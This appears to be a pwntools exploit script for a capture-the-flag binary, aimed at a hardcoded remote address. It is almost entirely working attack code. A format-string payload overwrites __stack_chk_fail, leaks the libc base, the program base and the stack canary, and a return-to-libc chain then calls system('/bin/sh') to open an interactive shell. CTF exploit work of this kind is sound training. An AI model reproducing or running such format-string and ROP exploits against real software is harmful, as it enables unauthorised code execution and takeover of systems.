#! /usr/bin/python3

# 9x14S' exploit template. The only relevant code is usually in the `main` function and
# the `for` loop that calls it if it needs to bruteforce something.

from pwn import *

REMOTE = "nc 34.29.214.123 5000"
context.binary = b = ELF("./chall")
context.arch = "amd64"
context.timeout = Timeout.forever
context.log_console = sys.stderr
context.terminal = ["/usr/bin/alacritty", "-e"]
# context.terminal = ["tmux", "splitw", "-h"]
libc = b.libc


def main(bf=0):
    bf = bf # To shut up whatever Python syntax highlighter I use
    t = conn()

    # Unneeded but I'm leaking pie anyway
    main_offset = 0x1275 - 44
    stack_chk_offset = 0x4018

    payload = flat(
        f"%{main_offset}c",
        "%17$hn", # overwrite __stack_chk_fail
        "##%33$p\n", # __libc_start_main+139
        "%37$p\n", # pie (main)
        "%31$p\n", # canary
        )

    exploit = flat(
        payload.ljust(81, b'\x90'),
        p16(stack_chk_offset),
        )

    t.send(exploit)

    sleep(1.5)

    t.recvuntil(b"##")
    libc.address = int(t.recvline(), 16) - 0x2a28b # offset
    b.address = int(t.recvline(), 16) - main_offset
    canary = int(t.recvline(), 16)

    info(f"{libc.address = :x}")
    info(f"{b.address = :x}")
    info(f"{canary = :x}")

    pop_rdi = libc.address + 0x000000000010f75b
    ret = libc.address + 0x000000000010f75b + 1

    pop_shell = flat(
        b'A', # Align
        # b'FILLER00',
        canary,
        canary,
        pop_rdi,
        next(libc.search(b"/bin/sh\x00")),
        ret,
        libc.sym["system"],
    )

    t.sendline(pop_shell)

    t.interactive()
    t.close()


# Handles a 'nc addr port' string like those provided in CTFs
def get_addr(s: str):
    s = s.strip().removeprefix('nc ')
    splitter = ':' if ':' in s else ' '
    addr = s.split(splitter)[0]
    port = int(s.split(splitter)[1])
    return (addr, port)


def conn() -> remote | process:
    if args.I or args.INFO or args.i or args.info:
        context.log_level = "info"
    else:
        context.log_level = "debug"

    if args.R or args.REMOTE or args.r or args.remote: # Remote host
        if REMOTE == "":
            error(f"REMOTE not set")
        t = remote(*get_addr(REMOTE))
    else:
        t = process([b.path])
        if args.G or args.GDB or args.g or args.gdb:
            gdb.attach(t, gdbscript="""
            b *vuln+61
            c
            """)
    """

    """
    return t

# Bruteforcing setup
for i in range(1):
    print(f"{i=}")
    main(i)
